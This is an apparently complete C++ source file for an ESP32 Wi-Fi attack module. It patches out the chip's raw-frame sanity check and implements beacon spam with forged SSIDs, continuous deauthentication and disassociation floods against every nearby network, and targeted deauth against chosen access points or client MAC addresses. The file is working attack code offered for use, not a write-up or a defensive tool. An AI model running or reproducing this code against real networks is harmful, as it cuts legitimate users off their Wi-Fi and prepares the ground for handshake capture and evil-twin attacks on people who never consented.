#include "wifi_attacks_module.h"

// Deauth frame default structure
const uint8_t WiFiAttacksModule::deauthFrameDefault[26] = {
    0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0xf0, 0xff, 0x02, 0x00
};

// Override function for bypassing ESP32 raw frame sanity check
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    if (arg == 31337) return 1;
    else return 0;
}

void WiFiAttacksModule::setup() {
    Serial.println("[WiFi Attacks] Module initialized");
    memcpy(deauthFrame, deauthFrameDefault, sizeof(deauthFrameDefault));
}

void WiFiAttacksModule::loop() {
    // Continuous loop handling if needed
}

void WiFiAttacksModule::sendRawFrame(const uint8_t* frameBuffer, int size) {
    esp_wifi_80211_tx(WIFI_IF_AP, frameBuffer, size, false);
    vTaskDelay(1 / portTICK_RATE_MS);
    esp_wifi_80211_tx(WIFI_IF_AP, frameBuffer, size, false);
    vTaskDelay(1 / portTICK_RATE_MS);
    esp_wifi_80211_tx(WIFI_IF_AP, frameBuffer, size, false);
    vTaskDelay(1 / portTICK_RATE_MS);
}

void WiFiAttacksModule::prepareDeauthFrame(const wifi_ap_record_t* apRecord, uint8_t channel, 
                                            const uint8_t target[6]) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    vTaskDelay(50 / portTICK_RATE_MS);
    
    if (target) {
        memcpy(&deauthFrame[4], target, 6);  // Destination: specific target
    } else {
        // Broadcast deauth
        uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        memcpy(&deauthFrame[4], broadcast, 6);
    }
    
    memcpy(&deauthFrame[10], apRecord->bssid, 6);  // Source: AP MAC
    memcpy(&deauthFrame[16], apRecord->bssid, 6);  // BSSID: AP MAC
}

std::vector<wifi_ap_record_t> WiFiAttacksModule::scanNetworks() {
    std::vector<wifi_ap_record_t> results;
    
    WiFi.mode(WIFI_STA);
    Serial.println("[WiFi Attacks] Scanning networks...");
    
    int n = WiFi.scanNetworks();
    Serial.printf("[WiFi Attacks] Found %d networks\n", n);
    
    for (int i = 0; i < n; i++) {
        wifi_ap_record_t record;
        memcpy(record.bssid, WiFi.BSSID(i), 6);
        record.primary = WiFi.channel(i);
        results.push_back(record);
    }
    
    return results;
}

void WiFiAttacksModule::startBeaconSpam(const std::vector<String>& ssids) {
    Serial.println("[WiFi Attacks] Starting Beacon Spam");
    attackActive = true;
    
    WiFi.mode(WIFI_AP);
    WiFi.softAP("BeaconSpam", "", 1, 1, 4, false);
    
    uint8_t beaconPacket[128];
    int currentChannel = 1;
    int ssidIndex = 0;
    
    while (attackActive) {
        // Rotate through channels 1-13
        esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
        
        // Send beacon for each SSID
        for (const String& ssid : ssids) {
            sendBeaconFrame(ssid, currentChannel);
            vTaskDelay(10 / portTICK_RATE_MS);
            
            if (!attackActive) break;
        }
        
        currentChannel++;
        if (currentChannel > 13) currentChannel = 1;
        
        vTaskDelay(100 / portTICK_RATE_MS);
    }
    
    WiFi.mode(WIFI_OFF);
    Serial.println("[WiFi Attacks] Beacon Spam stopped");
}

void WiFiAttacksModule::sendBeaconFrame(const String& ssid, uint8_t channel) {
    // Beacon frame structure (simplified)
    uint8_t beacon[128];
    int packetSize = 0;
    
    // Frame control
    beacon[0] = 0x80;  // Beacon frame
    beacon[1] = 0x00;
    packetSize += 2;
    
    // Duration
    beacon[2] = 0x00;
    beacon[3] = 0x00;
    packetSize += 2;
    
    // Destination (broadcast)
    for (int i = 0; i < 6; i++) beacon[packetSize++] = 0xFF;
    
    // Source (random MAC)
    for (int i = 0; i < 6; i++) beacon[packetSize++] = random(256);
    
    // BSSID (same as source)
    for (int i = 6; i < 12; i++) beacon[packetSize++] = beacon[i];
    
    // Sequence number
    beacon[packetSize++] = 0x00;
    beacon[packetSize++] = 0x00;
    
    // Timestamp (8 bytes)
    for (int i = 0; i < 8; i++) beacon[packetSize++] = 0x00;
    
    // Beacon interval
    beacon[packetSize++] = 0x64;
    beacon[packetSize++] = 0x00;
    
    // Capability info
    beacon[packetSize++] = 0x01;
    beacon[packetSize++] = 0x04;
    
    // SSID parameter set
    beacon[packetSize++] = 0x00;  // Tag: SSID
    beacon[packetSize++] = ssid.length();  // Length
    for (unsigned int i = 0; i < ssid.length(); i++) {
        beacon[packetSize++] = ssid[i];
    }
    
    // Send frame
    esp_wifi_80211_tx(WIFI_IF_AP, beacon, packetSize, false);
}

void WiFiAttacksModule::startDeauthFlood() {
    Serial.println("[WiFi Attacks] Starting Deauth Flood");
    attackActive = true;
    
    WiFi.mode(WIFI_AP);
    WiFi.softAP("DeauthFlood", "", 1, 1, 4, false);
    
    auto networks = scanNetworks();
    
    uint32_t lastScan = millis();
    uint32_t frameCount = 0;
    
    while (attackActive) {
        // Rescan every 60 seconds
        if (millis() - lastScan > 60000) {
            networks = scanNetworks();
            lastScan = millis();
        }
        
        // Attack each network
        for (const auto& ap : networks) {
            prepareDeauthFrame(&ap, ap.primary);
            
            // Send multiple deauth frames
            for (int i = 0; i < 10; i++) {
                deauthFrame[0] = 0xC0;  // Deauth
                sendRawFrame(deauthFrame, sizeof(deauthFrame));
                
                deauthFrame[0] = 0xA0;  // Disassociate
                sendRawFrame(deauthFrame, sizeof(deauthFrame));
                
                frameCount += 6;
                
                if (!attackActive) break;
            }
            
            if (!attackActive) break;
        }
        
        // Log frame count every 2 seconds
        static uint32_t lastLog = 0;
        if (millis() - lastLog > 2000) {
            Serial.printf("[WiFi Attacks] Frames sent: %d/s\n", frameCount / 2);
            frameCount = 0;
            lastLog = millis();
        }
    }
    
    WiFi.mode(WIFI_OFF);
    Serial.println("[WiFi Attacks] Deauth Flood stopped");
}

void WiFiAttacksModule::startTargetedDeauth(const String& ssid, const uint8_t* bssid, uint8_t channel) {
    Serial.printf("[WiFi Attacks] Starting targeted deauth on %s (channel %d)\n", ssid.c_str(), channel);
    attackActive = true;
    
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid, "", channel, 1, 4, false);
    
    wifi_ap_record_t ap;
    memcpy(ap.bssid, bssid, 6);
    ap.primary = channel;
    
    prepareDeauthFrame(&ap, channel);
    
    uint32_t frameCount = 0;
    uint32_t lastLog = millis();
    
    while (attackActive) {
        deauthFrame[0] = 0xC0;  // Deauth frame
        sendRawFrame(deauthFrame, sizeof(deauthFrame));
        
        deauthFrame[0] = 0xA0;  // Disassociate frame
        sendRawFrame(deauthFrame, sizeof(deauthFrame));
        
        frameCount += 6;
        
        // Log every 2 seconds
        if (millis() - lastLog > 2000) {
            Serial.printf("[WiFi Attacks] Frames: %d/s\n", frameCount / 2);
            frameCount = 0;
            lastLog = millis();
        }
        
        vTaskDelay(50 / portTICK_RATE_MS);
    }
    
    WiFi.mode(WIFI_OFF);
    Serial.println("[WiFi Attacks] Targeted deauth stopped");
}

void WiFiAttacksModule::startDeauthAttack(const uint8_t* targetMAC, uint8_t channel) {
    Serial.println("[WiFi Attacks] Starting Deauth Attack on specific target");
    // Implementation similar to targeted deauth but with specific MAC
    attackActive = true;
    
    WiFi.mode(WIFI_AP);
    WiFi.softAP("Deauth", "", channel, 1, 4, false);
    
    wifi_ap_record_t ap;
    memcpy(ap.bssid, targetMAC, 6);
    ap.primary = channel;
    
    prepareDeauthFrame(&ap, channel, targetMAC);
    
    while (attackActive) {
        sendRawFrame(deauthFrame, sizeof(deauthFrame));
        vTaskDelay(50 / portTICK_RATE_MS);
    }
    
    WiFi.mode(WIFI_OFF);
}

void WiFiAttacksModule::stopAttack() {
    Serial.println("[WiFi Attacks] Stopping attack");
    attackActive = false;
    WiFi.mode(WIFI_OFF);
}
